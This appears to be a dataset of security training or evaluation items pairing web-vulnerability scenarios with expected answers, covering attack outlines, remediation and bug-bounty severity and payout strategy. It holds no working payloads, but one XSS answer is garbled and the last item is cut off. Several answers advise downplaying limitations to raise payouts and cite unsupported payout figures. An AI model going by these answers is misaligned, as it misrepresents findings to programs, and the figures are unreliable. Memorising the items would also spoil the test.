expected_answer: This is a race condition file access vulnerability where predictable temporary file names during the export process allow an attacker to access another user's export data by requesting the predictable file URL during the brief window between file creation and cleanup. If temporary files follow patterns like /tmp/export_[timestamp].csv or /tmp/export_[user_id].csv, an attacker can predict the filename and access it before it is deleted, exposing the exported data. The real-world impact includes unauthorized access to exported data containing sensitive information like user lists, financial reports, or business analytics, with the timing window being exploitable through automated polling or by deliberately slowing down the victim's export process. A proof-of-concept involves triggering an export operation, observing the temporary file naming pattern, then simultaneously triggering another user's export and polling for the predicted filename during the processing window, demonstrating access to the other user's export data. Remediation requires using cryptographically random temporary filenames that cannot be predicted, storing temporary files in per-user or per-session isolated directories with strict permissions, implementing direct-to-memory streaming export that avoids temporary files entirely, setting restrictive file permissions (600) on creation, implementing immediate cleanup after the export stream completes, and serving exports through authenticated download endpoints rather than static file URLs.

scenario: Application trusts client-provided discount percentage.
expected_answer: This is a business logic manipulation vulnerability where the server trusts client-supplied discount values without server-side validation, allowing an attacker to apply arbitrary discount percentages including 100% (free) or even negative values (which might credit their account) to any purchase. By intercepting the checkout request and modifying the discount parameter from the intended value to any percentage they choose, an attacker can purchase goods at significantly reduced prices or for free. The real-world impact is direct revenue loss for the business, as attackers can systematically purchase products at manipulated prices, potentially at scale through automation, and may also use negative discounts to inflate account balances or credits. A proof-of-concept involves adding items to a cart, proceeding to checkout, intercepting the request in Burp Suite, modifying the discount percentage field (e.g., changing from 10% to 99% or 100%), submitting the modified request, and verifying the order completes at the manipulated discounted price. Remediation requires validating all discounts server-side against the authoritative discount database, never accepting discount values from client input, implementing discount validation through coupon codes verified server-side, recalculating all pricing on the server using trusted data sources, implementing anomaly detection for unusual discount patterns, and adding financial reconciliation checks that flag transactions with unexpected discount amounts.

scenario: Admin endpoints rely on IP allowlist only.
expected_answer: This is a network trust bypass vulnerability where IP-only access control for admin endpoints can be circumvented through IP spoofing via trusted headers, SSRF exploitation from within the trusted network, or compromising any system within the allowlisted IP range. Attackers can manipulate X-Forwarded-For or X-Real-IP headers if the application trusts proxy-supplied client IPs, or leverage an SSRF vulnerability in any internet-facing service to make requests from the internal network that matches the allowlist. The real-world impact is full administrative access to the application, bypassing what appears to be a strong access control mechanism, enabling user management, data export, system configuration changes, and potentially remote code execution through admin functionality. A proof-of-concept involves testing X-Forwarded-For header injection with the allowlisted IP address, identifying any SSRF vulnerability that can be used to proxy requests through the trusted network, or exploiting any compromise of systems within the allowlisted IP range to demonstrate admin access from an unauthorized source. Remediation requires implementing defense-in-depth with multiple authentication layers beyond IP validation, adding proper authentication and authorization (credentials + MFA) on all admin endpoints regardless of source IP, configuring the application to ignore X-Forwarded-For from untrusted sources, implementing VPN or zero-trust network access for admin functions, and adding behavioral monitoring for admin endpoint access patterns.

scenario: A reset password endpoint leaks token via referer header.
expected_answer: This is a token leakage vulnerability through the HTTP Referer header, where the password reset token included in the URL is sent to third-party domains when the user clicks any external link on the reset page, or when the page loads resources (images, scripts, analytics) from external domains. The Referer header automatically includes the full URL of the referring page, which in this case contains the sensitive reset token, exposing it to every third-party service whose resources are loaded on the password reset page. The real-world impact is account takeover, as third-party analytics services, advertising networks, CDN providers, or any externally-loaded resource can capture the reset token from their server logs, and compromised or malicious third parties can use these tokens to reset user passwords. A proof-of-concept involves loading the password reset page while monitoring outgoing requests in browser DevTools, examining the Referer header on requests to third-party domains, and demonstrating that the full URL including the reset token is transmitted to external services. Remediation requires implementing the Referrer-Policy header set to 'no-referrer' or 'same-origin' on password reset pages, sending reset tokens via POST request body instead of URL parameters, adding the rel='noreferrer' attribute to all external links on reset pages, avoiding loading any third-party resources on security-sensitive pages, and using short-lived tokens that expire quickly to minimize the exploitation window.

scenario: Application uses old OAuth implicit flow for SPA.
expected_answer: This creates a token exposure vulnerability through the OAuth implicit flow, where the access token is returned directly in the URL fragment (#access_token=...) of the redirect URI, making it visible in browser history, server logs, referer headers, and potentially to malicious JavaScript on the page. The implicit flow was deprecated by OAuth 2.1 specifically because the access token transmission through URL fragments creates multiple interception points, and SPAs now have a secure alternative through the Authorization Code flow with PKCE. The real-world impact includes access token theft through browser history access, shoulder surfing, referrer leakage to third-party scripts, and browser extensions with URL access permissions, all leading to account takeover since the token provides immediate API access. A proof-of-concept involves completing the OAuth implicit flow, then demonstrating the access token is visible in the browser's address bar, stored in browser history (accessible via back button or history API), and transmitted in the Referer header if the page loads external resources. Remediation requires migrating to the Authorization Code flow with PKCE (Proof Key for Code Exchange) as recommended by OAuth 2.1, implementing a Backend-for-Frontend (BFF) pattern where tokens are exchanged and stored server-side, using short-lived access tokens with refresh token rotation, and disabling the implicit flow grant type in the OAuth provider configuration.
evaluation_criteria: Mentions access token in URL fragment.

scenario: A system does not validate content type before processing uploads.
expected_answer: This is a content-type spoofing vulnerability that can lead to remote code execution (RCE) when the server processes uploaded files based on the client-declared Content-Type or file extension without validating the actual file contents using magic byte analysis. An attacker can upload an executable file (PHP, JSP, ASPX, Python) with a spoofed Content-Type header claiming it is an image or document, and if the server routes file processing based on the declared type, the file may be stored and served in a way that enables execution. The real-world impact includes webshell deployment for persistent server access, arbitrary command execution through uploaded scripts, server compromise leading to data exfiltration and lateral movement, and potential infrastructure-wide compromise if the server has access to internal resources. A proof-of-concept involves crafting a PHP webshell file, setting the Content-Type to image/jpeg in the upload request, uploading through the endpoint, then accessing the uploaded file URL and testing for code execution by appending command parameters. Remediation requires implementing server-side content type validation using magic bytes (file signatures) rather than relying on client-declared Content-Type headers or extensions, storing uploads outside the webroot, serving uploaded files through a proxy that prevents execution, randomizing filenames, implementing antivirus scanning on uploads, and using a content-type whitelist based on business requirements.

scenario: Password reset endpoint lacks CAPTCHA or throttling.
expected_answer: This enables automated brute force attacks against the password reset mechanism, including mass password reset token guessing, credential stuffing through the reset flow, and denial of service through mass reset email generation flooding users' inboxes. Without CAPTCHA or throttling, an attacker can submit thousands of reset requests per second to enumerate valid accounts, brute-force reset tokens, and overwhelm email infrastructure with password reset notifications. The real-world impact includes successful brute force of weak reset tokens, user harassment through email flooding with reset notifications, email infrastructure overload that may affect all application emails, account enumeration through response analysis at high speed, and potential email provider reputation damage from mass automated emails. A proof-of-concept involves scripting rapid password reset requests for the same or different email addresses using Burp Intruder or a custom tool, demonstrating that no rate limiting or CAPTCHA challenge blocks the automated requests, measuring the maximum achievable request rate, and documenting the impact on the target email inbox. Remediation requires implementing progressive CAPTCHA challenges after the first few attempts, adding rate limiting per IP address and per target email, implementing exponential backoff delays between reset requests for the same account, limiting the number of active reset tokens per account, using token bucket or sliding window rate limiting algorithms, and implementing email sending throttling to prevent inbox flooding.

scenario: A web app allows HTML in profile bio field.
expected_answer: This is a Stored Cross-Site Scripting (XSS) vulnerability where HTML content entered in the profile bio field is persisted in the database and rendered without sanitization to every user who views the profile, enabling persistent malicious code execution. An attacker can inject JavaScript-capable HTML like or , saving the profile, visiting the profile page in another authenticated session, and demonstrating that the script executes and can access the viewer's cookies and session data. Remediation requires implementing server-side HTML sanitization using an allowlist-based library (DOMPurify, Bleach) that strips all script elements and event handlers, applying context-aware output encoding when rendering bio content, deploying Content Security Policy headers that prevent inline script execution, using a markdown-only input format that is rendered safely, and implementing content validation that rejects submissions containing HTML tags or JavaScript patterns.

scenario: An API reveals internal IP addresses in response headers.
expected_answer: This is an information disclosure vulnerability where internal IP addresses leaked through HTTP response headers (X-Powered-By, X-Backend-Server, Via, X-Forwarded-For, or custom debug headers) reveal the application's internal network topology, enabling targeted attacks against specific infrastructure components. Knowledge of internal IP addressing helps attackers identify subnet layouts, the number of backend servers, load balancing architecture, and potential SSRF targets within the internal network. The real-world impact includes accelerated reconnaissance for SSRF exploitation by providing exact internal targets, identification of infrastructure patterns that reveal cloud provider and deployment architecture, enabling targeted attacks against specific servers if combined with other vulnerabilities, and providing network topology information useful for lateral movement planning. A proof-of-concept involves sending requests to all API endpoints and examining response headers for internal IP patterns (10.x.x.x, 172.16-31.x.x, 192.168.x.x), documenting the discovered internal addresses and their associated endpoints, and mapping the inferred internal network topology. Remediation requires configuring reverse proxies and load balancers to strip all internal headers before sending responses to clients, removing debug and server identification headers in production, implementing a standardized header sanitization policy at the edge/CDN layer, auditing all custom response headers for information leakage, and configuring web frameworks to suppress server identification headers in production mode.

scenario: A file conversion API allows uploading arbitrary file types for processing.
prompt: What vulnerability chain should be evaluated?
expected_answer: This is a Remote Code Execution (RCE) vulnerability through malicious file parsing, where the file conversion engine (such as ImageMagick, LibreOffice, FFmpeg, or Ghostscript) processes attacker-supplied files that exploit parser vulnerabilities to execute arbitrary system commands. File processing libraries have a long history of critical vulnerabilities (e.g., ImageMagick's ImageTragick CVE-2016-3714) where specially crafted input files trigger command injection, buffer overflows, or server-side request forgery through the parser's functionality. The real-world impact is full server compromise through remote code execution, as a single malicious file upload can give the attacker shell access, enabling data exfiltration, cryptocurrency mining, ransomware deployment, and lateral movement to connected systems. A proof-of-concept involves identifying the file processing library through error messages or response headers, crafting a file that exploits known vulnerabilities in that library (e.g., an SVG with embedded code for ImageMagick, or a malicious ODT for LibreOffice), uploading it through the conversion endpoint, and demonstrating command execution through DNS callbacks or response content. Remediation requires running file processing in isolated sandboxes (containers or VMs) with no network access, keeping all file processing libraries updated to the latest patched versions, implementing strict file type validation using magic bytes, disabling dangerous features in processing libraries (e.g., ImageMagick's policy.xml), applying resource limits on conversion processes, and implementing a whitelist of allowed input and output formats.

scenario: A payment webhook processes events without verifying source signature.
expected_answer: This is a webhook forgery vulnerability leading to direct financial manipulation, where the payment webhook endpoint processes events like payment_intent.succeeded or charge.completed without verifying the cryptographic signature that proves the event was genuinely sent by the payment provider (Stripe, PayPal, etc.). An attacker who discovers the webhook URL can send fabricated payment confirmation events, causing the application to fulfill orders, credit accounts, or provision services without any actual payment being made. The real-world impact is direct financial fraud at scale, as an attacker can forge payment success notifications to receive goods and services for free, credit virtual wallets without paying, upgrade subscriptions without charges, and manipulate financial records, potentially causing massive revenue loss before detection. A proof-of-concept involves identifying the webhook endpoint URL through documentation, JavaScript source, or traffic analysis, crafting a JSON payload that mimics a successful payment event from the provider's webhook format, sending it to the endpoint via curl, and verifying the application processes the fraudulent event by checking for order fulfillment, account credits, or subscription upgrades. Remediation requires implementing webhook signature verification using the payment provider's SDK and signing secret, validating event timestamps to prevent replay attacks within a narrow window, verifying events by making a server-to-server callback to the payment provider's API to confirm the event is real, implementing IP allowlisting for known payment provider webhook sources, and adding financial reconciliation processes that compare webhook events against actual payment records.

scenario: An authenticated user can export all customer PII through a data export feature without rate limiting or audit logging.
prompt: How would you classify this finding and justify its severity?
expected_answer: This is a P1 severity finding despite potentially moderate CVSS scoring (authentication required reduces exploitability). The critical factor is business impact: enabling insider threat vectors, regulatory violations (GDPR/CCPA/HIPAA fines 4-20% revenue), mass data exfiltration capability, and direct liability exposure. A single authenticated user exfiltrating complete customer datasets represents existential risk. CVSS may score 5-6 due to authentication requirement, but business context elevates to P1. Document: (1) volume of exportable records, (2) PII categories (SSN, payment data, health info), (3) lack of rate limiting enabling bulk export, (4) absent audit trail preventing detection. This finding forces mandatory remediation regardless of CVSS, making it higher payout ($5k-20k range) than CVSS suggests. Programs prioritize findings threatening regulatory compliance and customer trust over technical exploitability metrics alone.
reasoning_requirement: Understand that business impact can exceed CVSS scoring in severity classification
evaluation_criteria: Identifies insider threat vector and regulatory exposure; Distinguishes business impact from technical CVSS; Quantifies data volume and PII sensitivity

scenario: Your research finds SQL injection in a parameter reported 6 months ago as patched. The patch validated one code path but missed another endpoint using the same parameter.
prompt: Is this a duplicate? How do you handle it?
expected_answer: Technically not a duplicate—it's an incomplete patch. Reference the original report, clearly document the difference: 'Original report patch addressed /api/search but missed /api/advanced-search endpoint, both accepting user_query parameter.' Demonstrate the bypass by showing both endpoints execute similar unvalidated SQL. This is repositionable as either 'incomplete patch validation' or 'related vulnerability.' Program handling varies significantly: HackerOne rewards relationship documentation and treats it as a fresh finding if exploitation differs; Bugcrowd may classify as duplicate and award reduced bounty (20-30% of original); Intigriti typically considers it a new finding since the original patch validation was incomplete. Provide side-by-side proof that both endpoints are vulnerable post-patch. This positioning affects payout $500-3k depending on platform. Always reference the original finding ID and explain why the patch scope was insufficient.
reasoning_requirement: Recognize incomplete patches and exploitation path variations across multiple endpoints
evaluation_criteria: References original report with specific fix gap analysis; Identifies patch boundary differences; Explains platform-specific duplicate policies

scenario: A vulnerability exists in a third-party JavaScript library loaded from CDN that's included in the target application. The library vulnerability itself is already publicly disclosed.
prompt: Should you report this? Why or why not?
expected_answer: Scope boundaries determine reportability—most programs exclude known vulnerabilities in unmodified dependencies. However, if the application misuses the library or uses an outdated version when current versions are patched, it's in-scope as a 'vulnerable dependency misconfiguration.' Check three factors: (1) Is the library version outdated? (2) Does the application use unsafe library features? (3) Does program scope explicitly include/exclude dependency vulnerabilities? HackerOne programs vary—some accept 'vulnerable dependency' reports ($500-2k) while others redirect to library maintainers. Bugcrowd typically declines known vulnerabilities. Intigriti requires active exploitation in-application context. The reframe that works: if upgrading the library would fix the vulnerability, it's in-scope misconfiguration. If the vulnerability exists in all current versions, it's likely out-of-scope unless you demonstrate application-specific exploitation. Clarify scope with program moderators before investing research effort.
reasoning_requirement: Distinguish between in-scope application vulnerability and out-of-scope library maintenance issues
evaluation_criteria: Analyzes version currency and patching status; Discusses application-specific misuse vs. inherent library flaws; References program scope clarification process

scenario: A subtle JWT secret weakness allows token prediction. Impact is limited to a sandbox environment accessible only after account creation.
prompt: On which platform would this likely receive higher payout: HackerOne, Bugcrowd, or Intigriti?
expected_answer: Platform-specific risk tolerance creates significant payout variance ($1k-5k spread). HackerOne rewards cryptographic weaknesses heavily—JWT secret prediction is P2-P3 ($2.5k-5k) regardless of sandbox limitation because crypto bugs are foundational. Bugcrowd emphasizes actual impact: sandbox-only access may reduce payout 40-60% ($600-1.5k) since damage is constrained. Intigriti sits between—strict scope definition but high crypto-bug premiums ($1.5k-3k). The sandbox limitation is key: HackerOne accepts 'cryptographic weakness' as vulnerability even with limited exploitation context; Bugcrowd requires demonstrable business impact; Intigriti requires active exploitation chain. Program maturity matters—enterprise programs (Microsoft, Google, AWS) value crypto bugs more than startups. Your strategy: submit to HackerOne first for maximum payout, frame as 'cryptographic weakness enabling sandbox account compromise,' minimize sandbox context. Expect HackerOne 60% higher payout than Bugcrowd for identical technical finding.
reasoning_requirement: Recognize program-specific risk tolerance and payout model differences
evaluation_criteria: Compares platform models with specific payout ranges; Identifies sandbox/limited-exposure impact factor; References program maturity effect on crypto-bug valuation

scenario: A researcher chains: (1) Account enumeration via username leak, (2) Weak password reset token (7-day validity, predictable), (3) Account takeover. No single issue seems P1, but the chain is devastating.
prompt: How do you position and score this chain for maximum clarity?
expected_answer: Impact amplification through chaining elevates individual P3/P4 findings into P2 or P1 classification. Document each step separately with reproduction steps showing the full chain: username enumeration demonstrates vulnerability, predicted token generation demonstrates weakness, full account takeover demonstrates impact. Programs value 'full chain' reports more than fragmented ones because they reveal systemic security failure. Score based on chain outcome (full account takeover = P1) not individual components. Include attack complexity: if the chain requires minimal interaction or predictable conditions, emphasize that to justify severity upgrade. Reference attack surface: how many users can be targeted? Are usernames enumerable at scale? Is 7-day token validity and predictability exploitable during that window? Include CVSS v3.1 vector accounting for the chain: Access Vector=Network, Privilege Required=None, User Interaction=None, Scope=Changed. This typically yields 8.5-9.2 (Critical). Provide working PoC demonstrating successful full chain exploitation.
reasoning_requirement: Recognize how vulnerability chains amplify individual findings into higher severity classifications
evaluation_criteria: Documents each component step separately; Scores based on chain outcome not individual metrics; Includes attack complexity and scale analysis

scenario: An application displays the current user's account ID in client-side HTML comments, accessible to any authenticated user. No further exploitation possible. CVSS 3.1 (Low).
prompt: Is this P4 or P5? Justify your classification.
expected_answer: This is P5 or potentially not reportable—CVSS 3.1 confirms low impact. Information disclosure exists but leaked data (account ID) lacks sensitivity. Most systems assign sequential or predictable IDs; exposure enables no privilege escalation, authentication bypass, or further data access. This is 'unnecessary information exposure' rather than true vulnerability. Programs like HackerOne may decline this per their disclosure policy excluding non-sensitive information leaks. P4 would require: (1) sensitive data leak (email, phone, API keys, tokens), (2) enabled by privilege escalation, or (3) enabling further exploitation chain. This meets none. Document as low-risk informational finding: 'HTML comments should not contain user identifiers, even non-sensitive ones, as they represent unnecessary information disclosure per OWASP.' Bugcrowd and Intigriti typically decline P5-level disclosures. If submitting, frame as 'development artifact exposure' rather than information disclosure vulnerability to improve acceptance chances.
reasoning_requirement: Distinguish between harmless information exposure and true information disclosure vulnerability with exploitable impact
evaluation_criteria: Acknowledges data sensitivity level and non-exploitability; Aligns CVSS score with finding; References program disclosure acceptance policies

scenario: A race condition requires microsecond-precision timing: (1) Account A initiates deletion, (2) Account B modifies A's data simultaneously, (3) Resulting state exposes A's deleted sensitive data. Reproducibility: 15%.
prompt: How do you document and score this race condition for maximum credibility?
expected_answer: High-complexity reproduction reduces program confidence despite real vulnerability. Document precisely: timing windows (microsecond-level), environmental factors (network latency, server load), reproducibility statistics (15% baseline success), improvement techniques (thread synchronization, concurrent libraries, load injection). Position as P2-P3, NOT P1, due to exploitation complexity—but counter Bugcrowd's 'complexity penalty' by demonstrating real-world exploitability. Explain why low reproducibility doesn't mean low severity: consistent load patterns in high-traffic applications make race conditions reliable (race condition occurs once per 6-7 exploit attempts in production = practical exploitation). Include reproducible PoC script using Python threading or Go goroutines that increases success rate to 40-60% through synchronization. Show that adversary can trigger race 100+ times without rate limiting, achieving exploitation despite 15% per-attempt rate. Reference similar accepted findings (Stripe, AWS race condition submissions) that accepted low-reproducibility findings with strong PoCs. Include CVSS v3.1 vector: Attack Complexity=High (due to timing requirement) typically yields 5.5-6.5 base score, but business impact justifies higher classification.
reasoning_requirement: Account for exploitation complexity and reproducibility in severity assessment while justifying real-world exploitability
evaluation_criteria: Documents timing precision requirements and environmental factors; Provides reproducibility statistics with improvement techniques; Includes PoC with synchronization methodology

scenario: XSS vulnerability exists in out-of-scope subdomain (help.company.com vs. in-scope app.company.com) but exploits cookies shared across domain.
prompt: How do you handle this on Intigriti's platform?
expected_answer: Intigriti enforces stricter scope than HackerOne—typically subdomains are explicitly listed and out-of-scope subdomains are rejected. However, cross-subdomain cookie exploitation can reframe this as in-scope. Strategy: document the finding as 'Cross-Subdomain XSS Attack Chain' affecting in-scope assets. Demonstrate: (1) XSS in help.company.com, (2) Session cookie set with domain=.company.com, (3) Attacker reads cookie and uses it to access app.company.com (in-scope), (4) Impact to in-scope application.
